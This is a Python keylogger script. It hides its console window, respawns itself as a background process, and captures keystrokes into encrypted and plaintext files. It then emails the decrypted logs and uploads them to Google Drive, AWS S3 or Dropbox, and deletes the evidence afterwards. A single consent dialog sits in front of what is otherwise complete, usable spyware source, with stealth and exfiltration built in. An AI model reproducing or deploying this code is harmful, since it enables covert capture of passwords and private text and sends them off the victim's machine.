import os
import sys
import yagmail
import logging
import platform
import tkinter as tk
import requests
import boto3
import subprocess
import time
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
from tkinter import messagebox
from pynput import keyboard
from cryptography.fernet import Fernet

# Stealth Mode: Hide Console (Windows)
def hide_console():
    if platform.system() == "Windows":
        import ctypes
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        SW_HIDE = 0
        hWnd = kernel32.GetConsoleWindow()
        if hWnd:
            user32.ShowWindow(hWnd, SW_HIDE)

# Hide console for stealth mode
hide_console()

# Run as Background Process (Windows)
def run_in_background():
    if platform.system() == "Windows":
        subprocess.Popen(["pythonw.exe", sys.argv[0]], creationflags=subprocess.CREATE_NO_WINDOW)
    elif platform.system() == "Linux":
        subprocess.Popen(["nohup", "python3", sys.argv[0], "&"])

# Logging Configuration
logging.basicConfig(filename="keystroke.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# Define File Paths
KEY_FILE = "secret.key"
LOG_FILE = "keylogger_encrypted.log"
LOCAL_LOG_PATH = "local_keylogs.txt"

# Generate or Load Encryption Key
def load_or_create_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)
        return key

# Load Encryption Key
key = load_or_create_key()
cipher = Fernet(key)

# Encrypt Keystrokes
def encrypt_log(data):
    encrypted_data = cipher.encrypt(data.encode())
    with open(LOG_FILE, "ab") as log_file:
        log_file.write(encrypted_data + b"\n")
    with open(LOCAL_LOG_PATH, "a") as local_log:
        local_log.write(data + "\n")

# GUI for User Consent
def get_user_consent():
    root = tk.Tk()
    root.withdraw()
    response = messagebox.askyesno("Consent Required", "Do you agree to enable keystroke logging?")
    return response

# Capture Keystrokes (Only Logs When 'Enter' is Pressed)
keystroke_buffer = []

def on_key_press(key):
    global keystroke_buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystroke_buffer.append(key.char)
        elif key == keyboard.Key.space:
            keystroke_buffer.append(" ")
        elif key == keyboard.Key.backspace:
            keystroke_buffer.append("[Backspace]")
        elif key == keyboard.Key.tab:
            keystroke_buffer.append("[Tab]")
    except Exception as e:
        logging.error(f"Error: {e}")

def on_key_release(key):
    global keystroke_buffer
    if key == keyboard.Key.enter:
        log_entry = "".join(keystroke_buffer) + "\n"
        logging.info(log_entry)
        encrypt_log(log_entry)
        keystroke_buffer = []  # Clear buffer after logging

    if key == keyboard.Key.esc:
        return False  # Stop Listener on 'Esc' Key

# Secure Email Sending (OAuth2)
def send_logs():
    try:
        decrypted_logs = ""
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as log_file:
                for line in log_file:
                    decrypted_logs += cipher.decrypt(line).decode() + "\n"

            # Configure Secure Email
            yag = yagmail.SMTP("your-email@gmail.com", oauth2=True)
            yag.send(
                to="recipient-email@gmail.com",
                subject="Encrypted Keylogger Logs",
                contents=decrypted_logs,
            )
            print(" Encrypted Logs Sent Securely!")

            # Auto-Delete Logs After Sending
            os.remove(LOG_FILE)
            print("Logs deleted for security.")
    except Exception as e:
        logging.error(f"Email Sending Failed: {e}")

# Cloud Storage Upload Options
def upload_to_cloud():
    root = tk.Tk()
    root.withdraw()
    cloud_option = messagebox.askquestion("Cloud Storage", "Where do you want to upload logs?\nYes: Google Drive\nNo: AWS S3\nCancel: Dropbox")

    if cloud_option == "yes":
        upload_to_google_drive()
    elif cloud_option == "no":
        upload_to_aws_s3()
    else:
        upload_to_dropbox()

# Upload to Google Drive
def upload_to_google_drive():
    try:
        gauth = GoogleAuth()
        gauth.LocalWebserverAuth()
        drive = GoogleDrive(gauth)

        log_file = drive.CreateFile({'title': LOCAL_LOG_PATH})
        log_file.SetContentFile(LOCAL_LOG_PATH)
        log_file.Upload()

        print("Logs uploaded to Google Drive!")
    except Exception as e:
        logging.error(f"Google Drive Upload Failed: {e}")

# Upload to AWS S3
def upload_to_aws_s3():
    try:
        s3 = boto3.client("s3", aws_access_key_id="YOUR_AWS_ACCESS_KEY", aws_secret_access_key="YOUR_AWS_SECRET_KEY")
        bucket_name = "your-s3-bucket-name"
        s3.upload_file(LOCAL_LOG_PATH, bucket_name, "logs/keylogger_logs.txt")

        print(" Logs uploaded to AWS S3!")
    except Exception as e:
        logging.error(f"AWS S3 Upload Failed: {e}")

# Upload to Dropbox
def upload_to_dropbox():
    try:
        dropbox_access_token = "YOUR_DROPBOX_ACCESS_TOKEN"
        with open(LOCAL_LOG_PATH, "rb") as f:
            requests.post("https://content.dropboxapi.com/2/files/upload",
                          headers={"Authorization": f"Bearer {dropbox_access_token}",
                                   "Dropbox-API-Arg": '{"path": "/keylogger_logs.txt"}',
                                   "Content-Type": "application/octet-stream"},
                          data=f)
        print("Logs uploaded to Dropbox!")
    except Exception as e:
        logging.error(f"Dropbox Upload Failed: {e}")

# Start Keylogger with User Consent
if get_user_consent():
    print("User consent granted. Running in background...")
    run_in_background()
    
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

    send_logs()
    upload_to_cloud()
else:
    print("User denied consent. Exiting.")